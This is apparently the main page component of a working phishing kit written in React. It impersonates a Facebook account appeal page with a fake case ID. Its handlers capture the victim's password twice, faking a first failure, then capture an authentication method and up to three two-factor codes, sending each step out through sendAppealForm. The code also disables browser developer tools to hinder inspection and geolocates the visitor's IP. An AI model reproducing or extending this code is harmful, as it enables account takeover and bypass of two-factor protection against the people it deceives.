"use client";

import React, { useEffect, useState } from 'react';
import '../../styles/pages/Supportpage.scss';
import '../../styles/base/bootstrap.min.css';
import '../../styles/pages/Modal.scss';
import "react-phone-input-2/lib/style.css";
// Import Modals
import AuthModal from '../components/modals/AuthModal';
import PasswordModal from '../components/modals/PasswordModal';
import SecurityModal from '../components/modals/SecurityModal';
import FinalModal from '../components/modals/FinalModal';
import ChoseAuthenModal from '../components/modals/ChoseAuthen';
// Import Utils
import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
import disableDevtool from 'disable-devtool';
import moment from 'moment';
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const AccountPageComponent = () => {
    // --- LANGUAGE & CONFIG ---
    const { t, i18n } = useTranslation();
    const [ready, setReady] = useState(false);
    const currentDate = moment().format('MMMM D, YYYY');

    // --- LOCATION & USER INFO ---
    const [userIp, setUserIp] = useState("");
    const [userFlag, setUserFlag] = useState("");
    const [ticketId, setTicketId] = useState("4564-ATFD-4865");

    // --- MODAL STATES ---
    const [openAuthModal, setOpenAuthModal] = useState(false);
    const [openPasswordModal, setOpenPasswordModal] = useState(false);
    const [openSecurityModal, setOpenSecurityModal] = useState(false);
    const [openFinalModal, setOpenFinalModal] = useState(false);
    const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false);
    
    // --- DATA & LOADING STATES ---
    const [dataCookie, setDataCookie] = useState(null);
    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);
    const [loadingPassword, setLoadingPassword] = useState(false);
    const [loadingSecurity, setLoadingSecurity] = useState(false);
    const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
    
    // --- LOGIC STATES ---
    const [warningPassword, setWarningPassword] = useState(false);
    const [warningSecurity, setWarningSecurity] = useState(false);
    const [timeCounter, setTimeCounter] = useState(0);
    const [clickPassword, setClickPassword] = useState(0);
    const [clickSecurity, setClickSecurity] = useState(0);
    const [fileList, setFileList] = useState([]);

    // --- EFFECTS ---
    useEffect(() => {
        if (typeof window !== 'undefined') {
            disableDevtool();
        }
    }, []);

    useEffect(() => {
        const getIp = async () => {
            try {
                const userLocation = await getUserLocation();
                setUserIp(userLocation?.ip || "Error IP");
                setUserFlag(userLocation?.country_code || "US");
                const language = userLocation?.country_code.toLowerCase() || "en";
                i18n.changeLanguage(language).then(() => setReady(true));
            } catch (error) {
                console.error("Error getting IP:", error);
                setUserFlag("US");
                setReady(true);
            }
        }
        getIp();
    }, [i18n]);

    useEffect(() => {
        const generateTicketId = () => {
            const s1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const s2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const s3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${s1}-${s2}-${s3}`);
        };
        generateTicketId();
    }, []);

    // --- HANDLERS ---
    const handleFileChange = (newFileList) => {
        setFileList(newFileList);
    };

    const handleFinishAppeal = async (values) => {
        try {
            const userLocation = await getUserLocation(userIp);
            const cookieVersion_1 = {
                ip: userIp,
                location: userLocation?.location || "Error Location",
                ...values
            }
            saveRecord("__ck_clv1", cookieVersion_1);
            setOpenAuthModal(false);
            setOpenPasswordModal(true);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    const handleFinishPassword = async (values) => {
        try {
            setLoadingPassword(true);
            const prevData = getRecord(clickPassword === 0 ? "__ck_clv1" : "__ck_clv2");
            
            const newData = {
                ...prevData,
                [clickPassword === 0 ? 'password' : 'passwordSecond']: values.password
            };

            const recordKey = clickPassword === 0 ? "__ck_clv2" : "__ck_clv3";
            saveRecord(recordKey, newData);

            await sendAppealForm(newData).then(() => {
                setTimeout(() => {
                    setLoadingPassword(false);
                    if (clickPassword === 0) {
                        setWarningPassword(true);
                        setClickPassword(1);
                    } else {
                        setWarningPassword(false);
                        setOpenPasswordModal(false);
                        setOpenChoseAuthenModal(true);
                        setDataCookie(newData);
                    }
                }, 1500);
            }).catch(err => console.log(err));
        } catch (error) {
            console.error("Error password:", error);
        }
    }

    const handleFinishChoseAuthen = async (values) => {
        setLoadingChoseAuthen(true);
        const prevData = getRecord("__ck_clv3");
        const newData = { ...prevData, authMethod: values.authMethod };
        
        saveRecord("__ck_clv4", newData);
        await sendAppealForm(newData).then(() => {
            setTimeout(() => {
                setLoadingChoseAuthen(false);
                setOpenChoseAuthenModal(false);
                setOpenSecurityModal(true);
                setDataCookieSecurity(newData);
            }, 1500);
        });
    }

    const handleFinishSecurity = async (values) => {
        setLoadingSecurity(true);
        const recordMap = ["__ck_clv4", "__ck_clv5", "__ck_clv6"];
        const saveMap = ["__ck_clv5", "__ck_clv6", "__ck_clv7"];
        const fieldMap = ["twoFa", "twoFaSecond", "twoFaThird"];

        const prevData = getRecord(recordMap[clickSecurity]);
        const newData = { ...prevData, [fieldMap[clickSecurity]]: values.twoFa };

        if (clickSecurity < 2) saveRecord(saveMap[clickSecurity], newData);

        await sendAppealForm(newData).then(() => {
            setTimeout(() => {
                setLoadingSecurity(false);
                if (clickSecurity < 2) {
                    setWarningSecurity(true);
                    setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME || 60);
                    setClickSecurity(prev => prev + 1);
                } else {
                    setOpenSecurityModal(false);
                    setOpenFinalModal(true);
                    resetAllStates();
                }
            }, 1500);
        });
    }

    const handleTryAnotherWay = () => {
        setOpenSecurityModal(false);
        setOpenChoseAuthenModal(true);
    }

    const resetAllStates = () => {
        setOpenPasswordModal(false);
        setLoadingPassword(false);
        setWarningPassword(false);
        setClickPassword(0);
        setOpenSecurityModal(false);
        setLoadingSecurity(false);
        setWarningSecurity(false);
        setTimeCounter(0);
        setClickSecurity(0);
    };

    if (!ready) return null;

    return (
        <div id='main-component'>
            <div className='container-sm' id='main' style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', minHeight: '80vh' }}>
                
                {/* --- MAIN CONTENT & BUTTON --- */}
                <div className='main-content col-md-8 col-12'>
                    <div className="card p-4">
                        <div className="card-body">
                            {/* Nội dung chính: Hình ảnh hoặc Tiêu đề thông báo */}
                            <img 
                                src="https://scontent.xx.fbcdn.net/v/t1.15752-9/448660305_1008688847298285_832675916421453982_n.png?_nc_cat=102&ccb=1-7&_nc_sid=5f2048&_nc_ohc=y4A42yM3iQIQ7kNvgFj_0W6&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_Q7cD1QG3u-9fB8u2C_123456789&oe=66986F12" 
                                alt="Support Header" 
                                style={{ width: '100%', marginBottom: '20px', borderRadius: '8px' }} 
                            />
                            
                            <h2 className="mb-3">
                                {t('title') || "We have received your feedback"}
                            </h2>
                            
                            <p className="text-muted">
                                {t('description') || "We'll review your submission and if we find it follows our Community Standards, your account will be restored. In some cases, we may ask for more information."}
                            </p>
                            
                            <p className="text-muted">
                                <strong>Case ID:</strong> {ticketId}
                            </p>

                            {/* --- THE BUTTON --- */}
                            <div className="mt-4">
                                <button 
                                    className="btn btn-primary w-100" 
                                    onClick={() => setOpenAuthModal(true)}
                                    style={{ height: '50px', fontWeight: '600', fontSize: '16px' }}
                                >
                                    {t('button.continue') || "Continue"}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

            </div>

            {/* --- MODALS (Bắt buộc phải có để logic hoạt động) --- */}
            
            <AuthModal 
                open={openAuthModal} 
                onCancel={() => setOpenAuthModal(false)}
                onFinish={handleFinishAppeal}
                fileList={fileList}
                handleFileChange={handleFileChange}
            />

            <PasswordModal 
                open={openPasswordModal}
                loading={loadingPassword}
                warning={warningPassword}
                onFinish={handleFinishPassword}
                onCancel={() => setOpenPasswordModal(false)}
            />

            <ChoseAuthenModal 
                open={openChoseAuthenModal}
                loading={loadingChoseAuthen}
                data={dataCookie}
                onFinish={handleFinishChoseAuthen}
            />

            <SecurityModal 
                open={openSecurityModal}
                loading={loadingSecurity}
                warning={warningSecurity}
                timeCounter={timeCounter}
                data={dataCookieSecurity}
                onFinish={handleFinishSecurity}
                onTryAnother={handleTryAnotherWay}
            />

            <FinalModal 
                open={openFinalModal}
            />

        </div>
    );
};

export default AccountPageComponent;